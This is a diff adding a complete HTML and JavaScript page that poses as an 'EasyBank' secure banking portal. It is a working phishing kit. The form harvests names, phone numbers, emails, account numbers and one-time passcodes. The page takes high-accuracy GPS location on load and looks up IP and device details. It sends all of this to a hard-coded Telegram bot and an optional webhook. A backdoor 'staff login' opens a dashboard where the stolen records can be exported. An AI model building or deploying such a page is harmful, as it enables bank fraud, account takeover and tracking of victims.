@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Banking Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; }
+        .secure-badge { background: #e0f2fe; color: #0369a1; border: 1px solid #bae6fd; }
+        .hidden-section { display: none !important; }
+        .fade-in { animation: fadeIn 0.3s ease-in-out; }
+        .modal-overlay { background-color: rgba(0, 0, 0, 0.5); backdrop-filter: blur(4px); }
+        
+        /* Chatbot Styles */
+        .chat-widget { position: fixed; bottom: 20px; right: 20px; z-index: 50; }
+        .chat-window { width: 350px; height: 450px; background: white; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); display: flex; flex-direction: column; overflow: hidden; }
+        .chat-messages { flex: 1; padding: 15px; overflow-y: auto; background: #f9fafb; }
+        .chat-input-area { padding: 10px; border-top: 1px solid #eee; display: flex; gap: 5px; background: white; }
+        .msg { margin-bottom: 10px; max-width: 80%; padding: 8px 12px; border-radius: 12px; font-size: 0.9rem; line-height: 1.4; }
+        .msg.bot { background: #e0f2fe; color: #0c4a6e; align-self: flex-start; border-bottom-left-radius: 2px; }
+        .msg.user { background: #1e40af; color: white; align-self: flex-end; margin-left: auto; border-bottom-right-radius: 2px; }
+        .typing-indicator { font-size: 0.8rem; color: #666; font-style: italic; margin-left: 10px; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body class="text-gray-800">
+
+    <!-- AI CHAT WIDGET -->
+    <div class="chat-widget">
+        <!-- Chat Button -->
+        <button id="chat-toggle-btn" onclick="toggleChat()" class="bg-blue-800 hover:bg-blue-900 text-white w-14 h-14 rounded-full shadow-lg flex items-center justify-center transition hover:scale-110">
+            <i class="fa-solid fa-robot text-2xl"></i>
+        </button>
+
+        <!-- Chat Window (Hidden by default) -->
+        <div id="chat-window" class="chat-window hidden-section mb-4 fade-in">
+            <div class="bg-blue-800 text-white p-4 flex justify-between items-center">
+                <div class="flex items-center gap-2">
+                    <i class="fa-solid fa-robot"></i>
+                    <span class="font-bold">EasyBank AI Assistant</span>
+                </div>
+                <button onclick="toggleChat()" class="text-white hover:text-gray-200"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div id="chat-messages" class="chat-messages flex flex-col">
+                <div class="msg bot">Hello! I am the EasyBank AI. Ask me about loans, accounts, or security! ✨</div>
+            </div>
+            <div class="chat-input-area">
+                <input type="text" id="chat-input" placeholder="Ask something..." class="flex-1 border border-gray-300 rounded-full px-4 py-2 text-sm focus:outline-none focus:border-blue-500" onkeypress="if(event.key === 'Enter') handleChatSubmit()">
+                <button onclick="handleChatSubmit()" class="bg-blue-600 text-white w-9 h-9 rounded-full flex items-center justify-center hover:bg-blue-700">
+                    <i class="fa-solid fa-paper-plane text-xs"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="bg-white border-b border-gray-200 sticky top-0 z-40">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <!-- Login Page Button -->
+                <button onclick="showPage('login-page')" class="flex items-center gap-2 px-4 py-2 rounded-lg bg-blue-50 hover:bg-blue-100 transition border border-blue-100">
+                    <i class="fa-solid fa-user-lock text-blue-800 text-xl"></i>
+                    <span class="text-lg font-bold text-gray-900">Login Page</span>
+                </button>
+                
+                <!-- Nav Links -->
+                <div class="flex items-center gap-4">
+                    <button onclick="showPage('booking-page')" class="text-sm font-medium text-gray-600 hover:text-blue-600">
+                        Apply Online
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- CONTAINER FOR ALL PAGES -->
+    <div class="max-w-[95rem] mx-auto px-4 py-8 sm:px-6 lg:px-8">
+
+        <!-- ======================= 1. APPLICATION PAGE ======================= -->
+        <div id="booking-page" class="fade-in">
+            <div class="space-y-6 max-w-2xl mx-auto">
+                
+                <!-- SUCCESS MESSAGE -->
+                <div id="success-msg" class="hidden-section bg-green-50 border border-green-200 text-green-800 rounded-xl p-6 text-center shadow-sm">
+                    <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fa-solid fa-check text-green-600 text-3xl"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold mb-2">Application Received</h2>
+                    <p class="mb-6">Thank you, <span id="success-name" class="font-bold">User</span>. Your application details have been securely submitted.</p>
+                    <button onclick="resetBookingForm()" class="bg-green-600 text-white px-6 py-2 rounded-lg font-medium hover:bg-green-700 transition">
+                        New Application
+                    </button>
+                </div>
+
+                <!-- MAIN FORM CONTAINER -->
+                <div id="booking-form-container">
+                    <form id="booking-form" onsubmit="event.preventDefault(); window.handleBooking(event)">
+                        
+                        <!-- Step 1: Contact Details -->
+                        <div class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 mb-6">
+                            <h2 class="text-lg font-bold mb-4 flex items-center gap-2">
+                                <span class="bg-blue-800 text-white w-6 h-6 rounded-full flex items-center justify-center text-xs">1</span>
+                                Applicant Details
+                            </h2>
+                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                                <div class="sm:col-span-2">
+                                    <label class="block text-sm font-medium text-gray-700 mb-1">Full Legal Name</label>
+                                    <input type="text" id="input-name" required placeholder="e.g. Jane Doe" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none">
+                                </div>
+
+                                <!-- Phone Number -->
+                                <div class="sm:col-span-2">
+                                    <label class="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
+                                    <div class="flex gap-2">
+                                        <input type="tel" id="input-phone" required placeholder="+1 (555) 000-0000" class="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none">
+                                        <button type="button" onclick="alert('OTP Sent: 123456')" class="bg-gray-900 text-white px-4 py-2 rounded-lg text-sm font-medium hover:bg-gray-800 transition shadow-sm whitespace-nowrap">
+                                            Send OTP
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Account Number -->
+                                <div class="sm:col-span-1">
+                                    <label class="block text-sm font-medium text-gray-700 mb-1">Member Acc. Number</label>
+                                    <input type="text" id="input-acc" placeholder="Loyalty ID" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none">
+                                </div>
+
+                                <div class="sm:col-span-1">
+                                    <label class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+                                    <input type="email" id="input-email" required placeholder="jane@example.com" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none">
+                                </div>
+
+                                <!-- Upload Photo Section -->
+                                <div class="sm:col-span-2 border-t border-gray-100 pt-4 mt-2">
+                                    <label class="block text-sm font-medium text-gray-700 mb-2">Upload Photo / ID Proof</label>
+                                    <input type="file" id="input-file" class="block w-full text-sm text-gray-500
+                                        file:mr-4 file:py-2 file:px-4
+                                        file:rounded-full file:border-0
+                                        file:text-sm file:font-semibold
+                                        file:bg-blue-50 file:text-blue-700
+                                        hover:file:bg-blue-100
+                                    "/>
+                                    <p class="text-xs text-gray-400 mt-1">Supported formats: JPG, PNG, PDF</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Step 2: Payment & Verification -->
+                        <div class="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
+                            <h2 class="text-lg font-bold mb-4 flex items-center gap-2">
+                                <span class="bg-blue-800 text-white w-6 h-6 rounded-full flex items-center justify-center text-xs">2</span>
+                                Verification & Payment
+                            </h2>
+                            
+                            <!-- HIDDEN OTP SECTION -->
+                            <div id="otp-container" class="hidden-section mb-6 bg-blue-50 p-4 rounded-lg border border-blue-100 fade-in">
+                                <label class="block text-sm font-medium text-blue-900 mb-2">
+                                    <i class="fa-solid fa-key mr-1"></i> Enter Verification OTP
+                                </label>
+                                <input type="text" id="input-otp" placeholder="Enter 6-digit code" class="w-full px-4 py-2 border border-blue-200 rounded-lg text-center tracking-widest font-mono text-lg focus:ring-2 focus:ring-blue-500 outline-none bg-white">
+                                <p class="text-xs text-blue-600 mt-1 text-center">Enter the code sent to your phone above.</p>
+                            </div>
+
+                            <div class="secure-badge p-4 rounded-lg mb-6 flex items-start gap-3">
+                                <i class="fa-solid fa-shield-halved mt-1"></i>
+                                <div class="text-sm">
+                                    <p class="font-bold">Payments are processed securely.</p>
+                                    <p>We do not store your credit card or bank details. You will be redirected to a secure gateway.</p>
+                                </div>
+                            </div>
+
+                            <div class="space-y-3">
+                                <label class="flex items-center justify-between p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition border-blue-500 bg-blue-50">
+                                    <div class="flex items-center gap-3">
+                                        <input type="radio" name="payment" value="Card" checked class="text-blue-600 focus:ring-blue-500">
+                                        <span class="font-medium">Credit / Debit Card</span>
+                                    </div>
+                                    <div class="flex gap-2 text-gray-400 text-xl">
+                                        <i class="fa-brands fa-cc-visa"></i>
+                                        <i class="fa-brands fa-cc-mastercard"></i>
+                                    </div>
+                                </label>
+                                
+                                <label class="flex items-center justify-between p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+                                    <div class="flex items-center gap-3">
+                                        <input type="radio" name="payment" value="PayPal" class="text-blue-600 focus:ring-blue-500">
+                                        <span class="font-medium">PayPal</span>
+                                    </div>
+                                    <i class="fa-brands fa-paypal text-blue-800 text-xl"></i>
+                                </label>
+
+                                <label class="flex items-center justify-between p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+                                    <div class="flex items-center gap-3">
+                                        <input type="radio" name="payment" value="Bank Transfer" class="text-blue-600 focus:ring-blue-500">
+                                        <div>
+                                            <span class="font-medium block">Direct Bank Transfer</span>
+                                        </div>
+                                    </div>
+                                    <i class="fa-solid fa-building-columns text-gray-400 text-xl"></i>
+                                </label>
+                            </div>
+
+                            <div class="mt-6 pt-6 border-t border-gray-100">
+                                <button type="submit" class="w-full bg-blue-800 hover:bg-blue-900 text-white font-bold py-3 rounded-lg shadow-lg shadow-blue-600/30 transition flex items-center justify-center gap-2">
+                                    <span id="submit-btn-text">Submit Application</span>
+                                    <i class="fa-solid fa-arrow-right"></i>
+                                </button>
+                                <p class="text-center text-xs text-gray-500 mt-3 flex items-center justify-center gap-1">
+                                    <i class="fa-solid fa-lock"></i> Encrypted 256-bit SSL Connection
+                                </p>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- ======================= 2. LOGIN PAGE ======================= -->
+        <div id="login-page" class="hidden-section fade-in">
+            <div class="max-w-md mx-auto bg-white p-8 rounded-xl shadow-lg border border-gray-100 mt-10">
+                <div class="text-center mb-8">
+                    <div class="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fa-solid fa-building-columns text-blue-800 text-2xl"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold text-gray-900">Staff Login</h2>
+                    <p class="text-gray-500 text-sm">Access the secure banking dashboard</p>
+                </div>
+
+                <form onsubmit="event.preventDefault(); window.handleLogin(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-1">User ID</label>
+                        <input type="text" id="login-user" required class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                        <input type="password" id="login-pass" required class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none">
+                    </div>
+                    <button type="submit" class="w-full bg-gray-900 text-white font-bold py-3 rounded-lg hover:bg-gray-800 transition">
+                        Authenticate
+                    </button>
+                </form>
+                <div id="login-error" class="text-red-500 text-sm text-center mt-4 hidden-section font-medium bg-red-50 p-2 rounded border border-red-100">
+                    Invalid User ID or Password.
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================= 3. ADMIN DASHBOARD ======================= -->
+        <div id="admin-page" class="hidden-section fade-in">
+            <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
+                <div class="p-6 border-b border-gray-100 flex justify-between items-center bg-gray-50">
+                    <div>
+                        <h2 class="text-xl font-bold text-gray-900">All Application Records</h2>
+                        <p class="text-sm text-gray-500">View and download customer data.</p>
+                        <!-- Updated Status Indicator -->
+                        <p id="connection-status" class="text-xs text-orange-600 mt-1 font-bold flex items-center">
+                            <i class="fa-solid fa-circle text-[8px] animate-pulse mr-1"></i> Connecting to Cloud...
+                        </p>
+                    </div>
+                    <div class="flex gap-2">
+                        <button onclick="window.downloadCSV()" class="bg-green-600 text-white text-sm font-bold px-4 py-2 rounded hover:bg-green-700 transition flex items-center gap-2">
+                            <i class="fa-solid fa-file-excel"></i> Download Excel
+                        </button>
+                        <button onclick="window.logout()" class="text-red-600 text-sm font-medium hover:text-red-800 px-3 py-2">
+                            <i class="fa-solid fa-right-from-bracket"></i> Logout
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left border-collapse">
+                        <thead>
+                            <tr class="bg-gray-50 text-xs uppercase text-gray-500 font-semibold">
+                                <th class="p-4 border-b whitespace-nowrap">Time</th>
+                                <th class="p-4 border-b whitespace-nowrap">Name</th>
+                                <th class="p-4 border-b whitespace-nowrap">Phone</th>
+                                <th class="p-4 border-b whitespace-nowrap">Email</th>
+                                <th class="p-4 border-b whitespace-nowrap">IP Address</th>
+                                <th class="p-4 border-b whitespace-nowrap">GPS Location</th>
+                                <th class="p-4 border-b whitespace-nowrap">Device</th>
+                                <th class="p-4 border-b whitespace-nowrap">OTP</th>
+                                <th class="p-4 border-b whitespace-nowrap">Acc. Number</th>
+                                <th class="p-4 border-b whitespace-nowrap">Payment</th>
+                                <th class="p-4 border-b whitespace-nowrap text-purple-700">AI Risk Scan ✨</th>
+                            </tr>
+                        </thead>
+                        <tbody id="booking-table-body" class="text-sm text-gray-700">
+                            <!-- Data will be injected here by JS -->
+                        </tbody>
+                    </table>
+                </div>
+                <div id="no-data-msg" class="p-8 text-center text-gray-500 hidden-section">
+                    Loading data from cloud...
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- JAVASCRIPT LOGIC WITH FIREBASE & ERROR HANDLING -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // --- GLOBAL SETUP ---
+        let app, auth, db;
+        let isFirebaseActive = false;
+        
+        // --- TELEGRAM CONFIGURATION ---
+        const TG_BOT_TOKEN = "8243719368:AAFMF9hlxc1S9PMfs25N2HIGIpkCcCTxWNU"; // Updated Token
+        const TG_CHAT_ID = "1012749807";     // Updated Chat ID
+
+        // --- NGROK CONFIGURATION ---
+        const WEBHOOK_URL = ""; 
+
+        // --- GEMINI AI INTEGRATION ---
+        const GEMINI_API_KEY = ""; // Runtime Key
+
+        // --- TELEGRAM SENDER FUNCTION ---
+        async function sendToTelegram(data) {
+            if(!TG_BOT_TOKEN || TG_BOT_TOKEN === "YOUR_BOT_TOKEN") return;
+            
+            const text = `
+🦁 *New Application Received* 🦁
+
+👤 *Name:* ${data.name}
+📱 *Phone:* ${data.phone}
+📧 *Email:* ${data.email}
+🔑 *OTP:* ${data.otp}
+🏦 *Account:* ${data.acc}
+💰 *Method:* ${data.method}
+
+📍 *Location:* ${data.location}
+🌐 *IP:* ${data.ip}
+📱 *Device:* ${data.device}
+            `;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TG_CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                console.log("Telegram notification sent.");
+            } catch (e) {
+                console.error("Telegram Error:", e);
+            }
+        }
+
+        // 1. Call Gemini API
+        window.callGemini = async function(prompt) {
+            if (!GEMINI_API_KEY) {
+                // Key handled by env
+            }
+
+            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${GEMINI_API_KEY}`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
+                });
+                
+                if (!response.ok) throw new Error("AI Busy");
+                const data = await response.json();
+                return data.candidates?.[0]?.content?.parts?.[0]?.text || "No response generated.";
+            } catch (error) {
+                console.error("Gemini Error:", error);
+                return "AI Service Unavailable. Please try again later.";
+            }
+        }
+
+        // 2. Chatbot Logic
+        window.toggleChat = function() {
+            const chatWin = document.getElementById('chat-window');
+            chatWin.classList.toggle('hidden-section');
+            if(!chatWin.classList.contains('hidden-section')) {
+                document.getElementById('chat-toggle-btn').classList.add('hidden-section');
+            } else {
+                document.getElementById('chat-toggle-btn').classList.remove('hidden-section');
+            }
+        }
+
+        window.handleChatSubmit = async function() {
+            const input = document.getElementById('chat-input');
+            const msgArea = document.getElementById('chat-messages');
+            const text = input.value.trim();
+            if (!text) return;
+
+            // User Msg
+            msgArea.innerHTML += `<div class="msg user">${text}</div>`;
+            input.value = "";
+            msgArea.scrollTop = msgArea.scrollHeight;
+
+            // Typing Indicator
+            const loadingId = "loading-" + Date.now();
+            msgArea.innerHTML += `<div id="${loadingId}" class="typing-indicator">AI is thinking...</div>`;
+            msgArea.scrollTop = msgArea.scrollHeight;
+
+            // AI Call
+            const prompt = `You are a helpful banking assistant for EasyBank. Keep answers short (under 50 words). User asks: ${text}`;
+            const reply = await window.callGemini(prompt);
+
+            // Remove loading and add Bot Msg
+            document.getElementById(loadingId).remove();
+            msgArea.innerHTML += `<div class="msg bot">${reply}</div>`;
+            msgArea.scrollTop = msgArea.scrollHeight;
+        }
+
+        // 3. Admin Analysis Logic
+        window.analyzeApplication = async function(index) {
+            const booking = bookings[index];
+            if (!booking) return;
+
+            const btn = document.getElementById(`analyze-btn-${index}`);
+            const originalText = btn.textContent;
+            btn.textContent = "Scanning...";
+            btn.disabled = true;
+
+            const dataSummary = `Name: ${booking.name}, IP: ${booking.ip}, Location: ${booking.location}, Browser: ${booking.browser}, Device: ${booking.device}`;
+            const prompt = `Analyze this banking application data for fraud risk. Be concise. Data: ${dataSummary}. Valid IP/Location match? Suspicious device? Verdict: Safe or Risky?`;
+
+            const analysis = await window.callGemini(prompt);
+            
+            alert(`✨ AI Analysis Result:\n\n${analysis}`);
+            
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+
+        // --- EXISTING FUNCTIONS ---
+        window.showPage = function(pageId) {
+            document.getElementById('booking-page').classList.add('hidden-section');
+            document.getElementById('login-page').classList.add('hidden-section');
+            document.getElementById('admin-page').classList.add('hidden-section');
+            document.getElementById(pageId).classList.remove('hidden-section');
+            if(pageId === 'booking-page') window.resetBookingForm();
+            document.getElementById('login-error').classList.add('hidden-section');
+        }
+
+        window.resetBookingForm = function() {
+            document.getElementById('booking-form').reset();
+            document.getElementById('booking-form-container').classList.remove('hidden-section');
+            document.getElementById('success-msg').classList.add('hidden-section');
+            document.getElementById('otp-container').classList.add('hidden-section');
+            const btn = document.getElementById('submit-btn-text');
+            if(btn) btn.textContent = "Submit Application";
+        }
+
+        window.logout = function() {
+            document.getElementById('login-user').value = "";
+            document.getElementById('login-pass').value = "";
+            window.showPage('login-page');
+        }
+
+        // --- FIREBASE INITIALIZATION ---
+        try {
+            const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : null;
+            const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+
+            if (firebaseConfig) {
+                app = initializeApp(firebaseConfig);
+                auth = getAuth(app);
+                db = getFirestore(app);
+                isFirebaseActive = true;
+                
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    signInWithCustomToken(auth, __initial_auth_token).catch(e => console.error("Auth Fail:", e));
+                } else {
+                    signInAnonymously(auth).catch(e => console.error("Auth Fail:", e));
+                }
+
+                onAuthStateChanged(auth, (user) => {
+                    if (user) setupRealtimeListener(db, appId);
+                });
+            } else {
+                console.warn("Firebase Config Missing. App running in Offline/Demo Mode.");
+            }
+        } catch (e) {
+            console.error("Firebase Init Error:", e);
+        }
+
+        // --- DATA & STATE ---
+        let bookings = []; 
+        let userIP = 'Loading...';
+        let userLocation = 'Locating...';
+
+        function setupRealtimeListener(database, id) {
+            try {
+                const q = collection(database, 'artifacts', id, 'public', 'data', 'bank_applications');
+                onSnapshot(q, (snapshot) => {
+                    bookings = []; 
+                    snapshot.forEach((doc) => bookings.push(doc.data()));
+                    bookings.sort((a, b) => new Date(b.time) - new Date(a.time));
+                    
+                    // Update Connection UI
+                    const statusEl = document.getElementById('connection-status');
+                    if(statusEl) {
+                        statusEl.innerHTML = '<i class="fa-solid fa-circle text-[8px] animate-pulse mr-1"></i> Live Database Active';
+                        statusEl.className = "text-xs text-green-600 mt-1 font-bold flex items-center";
+                    }
+
+                    if(window.location.hash !== "#login") window.renderAdminTable(); 
+                }, (error) => {
+                    console.error("Data Listen Error:", error);
+                    const statusEl = document.getElementById('connection-status');
+                    if(statusEl) {
+                        statusEl.innerHTML = '<i class="fa-solid fa-circle mr-1"></i> Connection Lost';
+                        statusEl.className = "text-xs text-red-600 mt-1 font-bold flex items-center";
+                    }
+                });
+            } catch (e) { console.error("Listener Error:", e); }
+        }
+
+        // --- GPS GRABBING FUNCTION (As requested) ---
+        // Step 1: Run code on load
+        function requestGPSLocation() {
+            if (navigator.geolocation) {
+                // Step 2: Browser shows popup (Allow/Block)
+                navigator.geolocation.getCurrentPosition(
+                    // Step 3: Success Case
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const long = position.coords.longitude;
+                        userLocation = `${lat}, ${long} (GPS Verified)`;
+                        console.log("GPS Location Captured:", userLocation);
+                    },
+                    // Error/Block Case
+                    (error) => {
+                        console.warn("GPS Permission Denied or Error:", error.message);
+                        // Fallback to IP location if GPS is blocked
+                        getIPAndFallbackLocation();
+                    },
+                    // ADDED: Options for High Accuracy
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                getIPAndFallbackLocation();
+            }
+        }
+
+        // Add Click Trigger for GPS
+        document.addEventListener('click', function() {
+            if (userLocation === 'Locating...' || userLocation === 'Unavailable') {
+                requestGPSLocation();
+            }
+        }, { once: true });
+
+        // Fallback Logic (IP Based)
+        async function getIPAndFallbackLocation() {
+            const apis = ['https://ipapi.co/json/', 'https://ipwho.is/'];
+            for (const url of apis) {
+                try {
+                    const response = await fetch(url);
+                    if (response.ok) {
+                        const data = await response.json();
+                        const ip = data.ip || data.query;
+                        const city = data.city;
+                        const country = data.country_name || data.country;
+                        
+                        if (ip) userIP = ip;
+                        // Only update location if GPS didn't already set it
+                        if (userLocation === 'Locating...') {
+                            userLocation = `${city}, ${country} (IP approx)`;
+                        }
+                        return; 
+                    }
+                } catch (error) { console.warn("Loc Fetch Fail:", error.message); }
+            }
+            if (userIP === 'Loading...') userIP = "Not Detected";
+            if (userLocation === 'Locating...') userLocation = "Unavailable";
+        }
+
+        // Trigger GPS request immediately
+        requestGPSLocation();
+
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = "Unknown", device = "Desktop";
+            if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Chrome")) browser = "Chrome"; 
+            else if (ua.includes("Safari")) browser = "Safari";
+            if (/Android|iPhone|iPad|Mobile/i.test(ua)) device = "Mobile";
+            return { browser, device };
+        }
+
+        // --- HANDLERS ---
+
+        window.handleBooking = async function(e) {
+            const otpContainer = document.getElementById('otp-container');
+            const submitBtnText = document.getElementById('submit-btn-text');
+
+            if (otpContainer.classList.contains('hidden-section')) {
+                const name = document.getElementById('input-name').value;
+                const phone = document.getElementById('input-phone').value;
+                if(!name || !phone) { alert("Please fill in Name and Phone first."); return; }
+                
+                otpContainer.classList.remove('hidden-section');
+                if(submitBtnText) submitBtnText.textContent = "Verify OTP & Submit";
+                alert("Please enter the OTP sent to your device.");
+                return;
+            }
+
+            const name = document.getElementById('input-name').value;
+            const phone = document.getElementById('input-phone').value;
+            const email = document.getElementById('input-email').value;
+            const otp = document.getElementById('input-otp').value || "N/A";
+            const acc = document.getElementById('input-acc').value || "N/A";
+            const fileInput = document.getElementById('input-file');
+            const fileName = fileInput.files.length > 0 ? fileInput.files[0].name : "No File";
+            const method = document.querySelector('input[name="payment"]:checked').value;
+            const info = getBrowserInfo();
+
+            const applicationData = {
+                time: new Date().toLocaleString(),
+                timestamp: Date.now(),
+                name, phone, email, otp, acc,
+                ip: userIP, location: userLocation,
+                browser: info.browser, device: info.device,
+                file: fileName, method
+            };
+
+            // WEBHOOK / NGROK INTEGRATION
+            if (WEBHOOK_URL) {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(applicationData)
+                }).then(() => console.log("Sent to Webhook")).catch(err => console.error("Webhook Failed", err));
+            }
+
+            // --- TELEGRAM SENDING ---
+            await sendToTelegram(applicationData);
+
+            if (isFirebaseActive && auth.currentUser) {
+                try {
+                    const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'bank_applications'), applicationData);
+                } catch (error) {
+                    console.error("Save Error:", error);
+                    alert("System Offline. Data not saved to cloud.");
+                }
+            } else {
+                bookings.unshift(applicationData);
+                console.warn("Offline Mode: Data saved locally only.");
+            }
+
+            document.getElementById('booking-form-container').classList.add('hidden-section');
+            document.getElementById('success-msg').classList.remove('hidden-section');
+            document.getElementById('success-name').textContent = name;
+        }
+
+        window.handleLogin = function(e) {
+            const user = document.getElementById('login-user').value.trim();
+            const pass = document.getElementById('login-pass').value.trim();
+            if(user.toLowerCase() === "akola" && pass.toLowerCase() === "akola") {
+                window.renderAdminTable();
+                window.showPage('admin-page');
+            } else {
+                document.getElementById('login-error').classList.remove('hidden-section');
+            }
+        }
+
+        window.renderAdminTable = function() {
+            const tbody = document.getElementById('booking-table-body');
+            const noData = document.getElementById('no-data-msg');
+            tbody.innerHTML = "";
+
+            if (bookings.length === 0) {
+                noData.classList.remove('hidden-section');
+                noData.textContent = isFirebaseActive ? "No applications in database." : "No data (Offline Mode)";
+                return;
+            } else {
+                noData.classList.add('hidden-section');
+            }
+
+            bookings.forEach((booking, index) => {
+                let locDisplay = booking.location || "N/A";
+                let coords = "";
+                if(locDisplay.includes(",")) {
+                    coords = locDisplay.split('(')[0].trim(); 
+                    locDisplay = `<a href="https://www.google.com/maps?q=${coords}" target="_blank" class="text-blue-600 underline hover:text-blue-800"><i class="fa-solid fa-map-location-dot"></i> ${locDisplay}</a>`;
+                }
+
+                const row = `
+                    <tr class="border-b hover:bg-gray-50 transition">
+                        <td class="p-4 text-gray-500 whitespace-nowrap text-xs">${booking.time}</td>
+                        <td class="p-4 font-medium text-gray-900">${booking.name}</td>
+                        <td class="p-4 whitespace-nowrap">${booking.phone}</td>
+                        <td class="p-4 text-gray-600">${booking.email}</td>
+                        <td class="p-4 font-mono text-xs text-red-600 bg-red-50 rounded">${booking.ip || 'N/A'}</td>
+                        <td class="p-4 text-xs font-medium text-blue-700 bg-blue-50 rounded whitespace-nowrap">${locDisplay}</td>
+                        <td class="p-4 text-gray-600 text-xs">${booking.device} (${booking.browser})</td>
+                        <td class="p-4 font-mono text-gray-600">${booking.otp}</td>
+                        <td class="p-4 font-mono text-blue-600">${booking.acc}</td>
+                        <td class="p-4">
+                            <span class="bg-green-100 text-green-700 px-2 py-1 rounded text-xs font-bold whitespace-nowrap">${booking.method}</span>
+                        </td>
+                        <td class="p-4">
+                            <button id="analyze-btn-${index}" onclick="window.analyzeApplication(${index})" class="bg-purple-600 text-white px-3 py-1 rounded text-xs font-bold hover:bg-purple-700 transition flex items-center gap-1">
+                                <i class="fa-solid fa-wand-magic-sparkles"></i> AI Scan
+                            </button>
+                        </td>
+                    </tr>
+                `;
+                tbody.innerHTML += row;
+            });
+        }
+
+        window.downloadCSV = function() {
+            let csvContent = "data:text/csv;charset=utf-8,";
+            csvContent += "Time,Name,Phone,Email,IP,Location,Browser,Device,OTP,Account,Payment\n";
+            bookings.forEach(row => {
+                const cleanRow = [
+                    row.time, row.name, row.phone, row.email, row.ip, 
+                    row.location, row.browser, row.device, row.otp, row.acc, row.method
+                ].map(field => `"${field || ''}"`).join(",");
+                csvContent += cleanRow + "\r\n";
+            });
+            const encodedUri = encodeURI(csvContent);
+            const link = document.createElement("a");
+            link.setAttribute("href", encodedUri);
+            link.setAttribute("download", "bank_records.csv");
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
